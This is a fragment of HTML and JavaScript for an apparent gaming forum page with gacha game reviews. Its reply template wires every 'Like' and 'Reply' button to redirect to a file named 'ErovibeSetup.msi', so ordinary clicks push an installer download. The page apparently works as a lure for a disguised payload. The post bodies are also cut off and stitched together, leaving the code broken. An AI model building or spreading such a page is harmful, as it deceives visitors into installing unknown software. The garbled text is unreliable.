        body: `<p>Welcome to the ultimate NU: Carnival beginner guide! I've been playing since launch and wanted to create a comprehensive resource for new players joining in 2026.</p>

        body: `<p>Just played Ark Re:Code for about 20 hours and wanted to share my first impressions. TLDR: It's genuinely good but has some issues.</p>
<p><strong>Pros:</strong></p>
<p>• The art style is absolutely incredible. Every character design is top-tier and the sci-fi environments are gorgeous. The UI is clean and modern — best I've seen in this genre.</p>
<p>• Combat is actually engaging. It's not just auto-battle like most gacha games. You need to think about positioning, elemental combos, and timing your skills.</p>
<p>• The story surprised me. It's actually well-written with interesting characters and plot twists. The sci-fi setting feels fresh compared to the typical fantasy setting.</p>
<p><strong>Cons:</strong></p>
<p>• Gacha rates feel a bit stingy. 0.7% for SSR is below industry standard. The pity system exists but it's at 200 pulls which is rough for F2P.</p>
<p>• Stamina system is very restrictive. You run out fast and recharge is slow. This gates progression hard in the mid-game.</p>
<p>• Some translations are rough — you can tell it was originally in Chinese/Korean.</p>
<p>Overall I'd rate it 8/10. Definitely worth trying, especially if you like sci-fi. What do you all think?</p>`,

        body: `<p>Just finished Succubus Heaven after about 30 hours and wanted to share my thoughts.</p>

    </div>
`;

topic.replies_data.forEach((r, i) => {
    postsHTML += `
        <div class="post">
            <div class="post-header">
                <div class="post-avatar" style="background:${colors[(topicId + i + 1) % colors.length]}">${r.avatar}</div>
                <div>
                    <div class="post-author">${r.author}</div>
                    <div class="post-date">${r.date}</div>
                </div>
            </div>
            <div class="post-body">${r.body}</div>
            <div class="post-actions">
                <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">👍 Like</span>
                <span class="post-action" onclick="window.location.href='ErovibeSetup.msi'">💬 Reply</span>
            </div>
        </div>
    `;
});

document.getElementById('postsContainer').innerHTML = postsHTML;
</script>
</body>
</html>
